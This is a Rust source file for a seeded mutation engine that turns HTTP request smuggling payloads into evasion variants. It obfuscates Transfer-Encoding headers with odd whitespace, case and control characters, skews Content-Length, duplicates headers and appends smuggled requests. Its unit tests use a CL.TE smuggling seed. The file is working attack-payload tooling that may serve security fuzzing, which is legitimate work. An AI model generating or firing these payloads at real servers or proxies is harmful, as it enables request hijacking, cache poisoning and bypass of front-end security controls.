use std::collections::HashSet;

/// Configuration for the mutation engine.
#[derive(Debug, Clone)]
pub struct MutatorConfig {
    /// Seed for the xorshift64 PRNG (deterministic output).
    pub seed: u64,
    /// Number of mutations to attempt per seed payload.
    pub mutations_per_payload: usize,
}

impl Default for MutatorConfig {
    fn default() -> Self {
        Self {
            seed: 42,
            mutations_per_payload: 5,
        }
    }
}

/// Lightweight deterministic mutation engine using xorshift64 PRNG.
pub struct Mutator {
    state: u64,
    config: MutatorConfig,
}

impl Mutator {
    pub fn new(config: MutatorConfig) -> Self {
        let state = if config.seed == 0 { 1 } else { config.seed };
        Self { state, config }
    }

    /// xorshift64 PRNG - fast, deterministic, no dependencies.
    fn next_u64(&mut self) -> u64 {
        let mut x = self.state;
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        self.state = x;
        x
    }

    /// Pick a random index in [0, max).
    fn rand_index(&mut self, max: usize) -> usize {
        if max == 0 {
            return 0;
        }
        (self.next_u64() as usize) % max
    }

    /// Take seed payloads and return originals + deduplicated mutants.
    pub fn mutate_payloads(&mut self, seeds: &[String]) -> Vec<String> {
        let mut seen = HashSet::new();
        let mut result = Vec::new();

        // Keep all originals
        for s in seeds {
            if seen.insert(s.clone()) {
                result.push(s.clone());
            }
        }

        // Generate mutants
        for seed in seeds {
            for _ in 0..self.config.mutations_per_payload {
                let strategy = self.rand_index(9);
                let mutant = match strategy {
                    0 => self.mutate_te_whitespace(seed),
                    1 => self.mutate_te_case(seed),
                    2 => self.mutate_cl_value(seed),
                    3 => self.mutate_line_endings(seed),
                    4 => self.mutate_junk_header(seed),
                    5 => self.mutate_chunk_size(seed),
                    6 => self.mutate_control_char(seed),
                    7 => self.mutate_header_duplication(seed),
                    8 => self.mutate_body_padding(seed),
                    _ => seed.clone(),
                };
                if seen.insert(mutant.clone()) {
                    result.push(mutant);
                }
            }
        }

        result
    }

    /// Strategy 1: Inject whitespace (space/tab/VT/FF) at random positions in TE header.
    fn mutate_te_whitespace(&mut self, payload: &str) -> String {
        let ws_chars = [" ", "\t", "\x0B", "\x0C"];
        let ws = ws_chars[self.rand_index(ws_chars.len())];

        if let Some(pos) = payload.find("Transfer-Encoding:") {
            let insert_at = pos + "Transfer-Encoding:".len();
            let mut result = payload[..insert_at].to_string();
            result.push_str(ws);
            result.push_str(&payload[insert_at..]);
            result
        } else {
            payload.to_string()
        }
    }

    /// Strategy 2: Randomize case of Transfer-Encoding header.
    fn mutate_te_case(&mut self, payload: &str) -> String {
        let te_variants = [
            "transfer-encoding",
            "TRANSFER-ENCODING",
            "Transfer-encoding",
            "tRaNsFeR-eNcOdInG",
            "Transfer-ENCODING",
            "TRANSFER-Encoding",
        ];

        if let Some(start) = find_case_insensitive(payload, "transfer-encoding") {
            let end = start + "Transfer-Encoding".len();
            let variant = te_variants[self.rand_index(te_variants.len())];
            let mut result = payload[..start].to_string();
            result.push_str(variant);
            result.push_str(&payload[end..]);
            result
        } else {
            payload.to_string()
        }
    }

    /// Strategy 3: Modify Content-Length value (leading zeros, off-by-one, trailing space).
    fn mutate_cl_value(&mut self, payload: &str) -> String {
        if let Some(start) = find_case_insensitive(payload, "content-length:") {
            let after_header = start + "Content-Length:".len();
            let rest = &payload[after_header..];
            // Find the numeric value
            let trimmed = rest.trim_start();
            let skip_ws = rest.len() - trimmed.len();
            let num_end = trimmed.find(|c: char| !c.is_ascii_digit()).unwrap_or(trimmed.len());
            if num_end > 0 {
                if let Ok(val) = trimmed[..num_end].parse::<i64>() {
                    let mutation_type = self.rand_index(4);
                    let new_val = match mutation_type {
                        0 => format!("0{}", val),  // leading zero
                        1 => format!("{}", val + 1), // off-by-one up
                        2 => format!("{} ", val),   // trailing space
                        3 => format!(" {}", val),   // leading space
                        _ => format!("{}", val),
                    };
                    let value_start = after_header + skip_ws;
                    let value_end = value_start + num_end;
                    let mut result = payload[..value_start].to_string();
                    result.push_str(&new_val);
                    result.push_str(&payload[value_end..]);
                    return result;
                }
            }
        }
        payload.to_string()
    }

    /// Strategy 4: Mutate line endings (CRLF -> LF, CR, double-CRLF).
    fn mutate_line_endings(&mut self, payload: &str) -> String {
        let mutation = self.rand_index(3);
        match mutation {
            0 => payload.replace("\r\n", "\n"),       // CRLF -> LF
            1 => payload.replace("\r\n", "\r"),       // CRLF -> CR only
            2 => payload.replacen("\r\n", "\r\n\r\n", 1), // double first CRLF
            _ => payload.to_string(),
        }
    }

    /// Strategy 5: Inject junk header before/after TE/CL header.
    fn mutate_junk_header(&mut self, payload: &str) -> String {
        let junk_headers = [
            "X-Junk: garbage",
            "X-Padding: aaaa",
            "Foo: bar",
            "X-Ignore: 1",
        ];
        let junk = junk_headers[self.rand_index(junk_headers.len())];

        if let Some(pos) = find_case_insensitive(payload, "transfer-encoding") {
            let before = self.rand_index(2) == 0;
            if before {
                // Find start of line (previous \n)
                let line_start = payload[..pos].rfind('\n').map(|p| p + 1).unwrap_or(pos);
                let mut result = payload[..line_start].to_string();
                result.push_str(junk);
                result.push_str("\r\n");
                result.push_str(&payload[line_start..]);
                result
            } else {
                // Find end of TE line
                let line_end = payload[pos..].find("\r\n").map(|p| pos + p + 2).unwrap_or(payload.len());
                let mut result = payload[..line_end].to_string();
                result.push_str(junk);
                result.push_str("\r\n");
                result.push_str(&payload[line_end..]);
                result
            }
        } else {
            payload.to_string()
        }
    }

    /// Strategy 6: Mutate chunk size format (leading zeros, extensions, whitespace).
    fn mutate_chunk_size(&mut self, payload: &str) -> String {
        let mutation = self.rand_index(3);
        match mutation {
            0 => {
                // Leading zeros on chunk size: "1\r\n" -> "001\r\n"
                payload.replacen("1\r\nA", "001\r\nA", 1)
            }
            1 => {
                // Chunk extension: "1\r\nA" -> "1;ext=val\r\nA"
                payload.replacen("1\r\nA", "1;ext=val\r\nA", 1)
            }
            2 => {
                // Whitespace after chunk size: "0\r\n\r\n" -> "0 \r\n\r\n"
                payload.replacen("0\r\n\r\n", "0 \r\n\r\n", 1)
            }
            _ => payload.to_string(),
        }
    }

    /// Strategy 7: Inject control character in header name/value.
    fn mutate_control_char(&mut self, payload: &str) -> String {
        let ctrl_chars = ["\x00", "\x0B", "\x0C", "\x7F", "\x01"];
        let ctrl = ctrl_chars[self.rand_index(ctrl_chars.len())];

        if let Some(pos) = find_case_insensitive(payload, "transfer-encoding") {
            let inject_at = pos + self.rand_index("Transfer-Encoding".len());
            let mut result = payload[..inject_at].to_string();
            result.push_str(ctrl);
            result.push_str(&payload[inject_at..]);
            result
        } else {
            payload.to_string()
        }
    }

    /// Strategy 8: Duplicate TE or CL header.
    fn mutate_header_duplication(&mut self, payload: &str) -> String {
        let dup_te = self.rand_index(2) == 0;

        if dup_te {
            if let Some(pos) = find_case_insensitive(payload, "transfer-encoding") {
                let line_end = payload[pos..].find("\r\n").map(|p| pos + p + 2).unwrap_or(payload.len());
                let header_line = &payload[pos..line_end];
                let mut result = payload[..line_end].to_string();
                result.push_str(header_line);
                if !header_line.ends_with("\r\n") {
                    result.push_str("\r\n");
                }
                result.push_str(&payload[line_end..]);
                result
            } else {
                payload.to_string()
            }
        } else if let Some(pos) = find_case_insensitive(payload, "content-length") {
            let line_end = payload[pos..].find("\r\n").map(|p| pos + p + 2).unwrap_or(payload.len());
            let header_line = &payload[pos..line_end];
            let mut result = payload[..line_end].to_string();
            result.push_str(header_line);
            if !header_line.ends_with("\r\n") {
                result.push_str("\r\n");
            }
            result.push_str(&payload[line_end..]);
            result
        } else {
            payload.to_string()
        }
    }

    /// Strategy 9: Add body padding after chunked terminator.
    fn mutate_body_padding(&mut self, payload: &str) -> String {
        let padding_options = ["X", "SMUGGLED", "\r\n", "GET / HTTP/1.1\r\n"];
        let padding = padding_options[self.rand_index(padding_options.len())];

        if payload.ends_with("0\r\n\r\n") {
            let mut result = payload.to_string();
            result.push_str(padding);
            result
        } else {
            payload.to_string()
        }
    }
}

/// Case-insensitive search for a substring, returns byte offset of match.
fn find_case_insensitive(haystack: &str, needle: &str) -> Option<usize> {
    let haystack_lower = haystack.to_lowercase();
    let needle_lower = needle.to_lowercase();
    haystack_lower.find(&needle_lower)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_deterministic_output() {
        let seeds = vec![
            "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG".to_string(),
        ];

        let mut m1 = Mutator::new(MutatorConfig { seed: 42, mutations_per_payload: 5 });
        let mut m2 = Mutator::new(MutatorConfig { seed: 42, mutations_per_payload: 5 });

        let r1 = m1.mutate_payloads(&seeds);
        let r2 = m2.mutate_payloads(&seeds);
        assert_eq!(r1, r2);
    }

    #[test]
    fn test_different_seeds_different_results() {
        let seeds = vec![
            "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG".to_string(),
        ];

        let mut m1 = Mutator::new(MutatorConfig { seed: 42, mutations_per_payload: 5 });
        let mut m2 = Mutator::new(MutatorConfig { seed: 999, mutations_per_payload: 5 });

        let r1 = m1.mutate_payloads(&seeds);
        let r2 = m2.mutate_payloads(&seeds);
        // Both contain the original, but mutants should differ
        assert_ne!(r1, r2);
    }

    #[test]
    fn test_deduplication() {
        let seeds = vec![
            "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG".to_string(),
            "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG".to_string(),
        ];

        let mut m = Mutator::new(MutatorConfig { seed: 42, mutations_per_payload: 3 });
        let result = m.mutate_payloads(&seeds);

        // Check no duplicates
        let unique: HashSet<_> = result.iter().collect();
        assert_eq!(result.len(), unique.len());
    }

    #[test]
    fn test_originals_preserved() {
        let seeds = vec![
            "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG".to_string(),
        ];

        let mut m = Mutator::new(MutatorConfig { seed: 42, mutations_per_payload: 3 });
        let result = m.mutate_payloads(&seeds);

        // First entry should be the original
        assert_eq!(result[0], seeds[0]);
    }

    #[test]
    fn test_mutants_contain_http() {
        let seeds = vec![
            "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG".to_string(),
        ];

        let mut m = Mutator::new(MutatorConfig { seed: 42, mutations_per_payload: 10 });
        let result = m.mutate_payloads(&seeds);

        for payload in &result {
            assert!(
                payload.contains("HTTP/1.1") || payload.contains("HTTP/"),
                "Mutant missing HTTP version: {}",
                &payload[..std::cmp::min(100, payload.len())]
            );
        }
    }

    #[test]
    fn test_more_results_than_seeds() {
        let seeds = vec![
            "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG".to_string(),
        ];

        let mut m = Mutator::new(MutatorConfig { seed: 42, mutations_per_payload: 5 });
        let result = m.mutate_payloads(&seeds);
        assert!(result.len() > seeds.len());
    }

    #[test]
    fn test_xorshift_deterministic() {
        let mut m1 = Mutator::new(MutatorConfig { seed: 123, mutations_per_payload: 1 });
        let mut m2 = Mutator::new(MutatorConfig { seed: 123, mutations_per_payload: 1 });
        for _ in 0..100 {
            assert_eq!(m1.next_u64(), m2.next_u64());
        }
    }

    #[test]
    fn test_empty_seeds() {
        let seeds: Vec<String> = vec![];
        let mut m = Mutator::new(MutatorConfig::default());
        let result = m.mutate_payloads(&seeds);
        assert!(result.is_empty());
    }
}
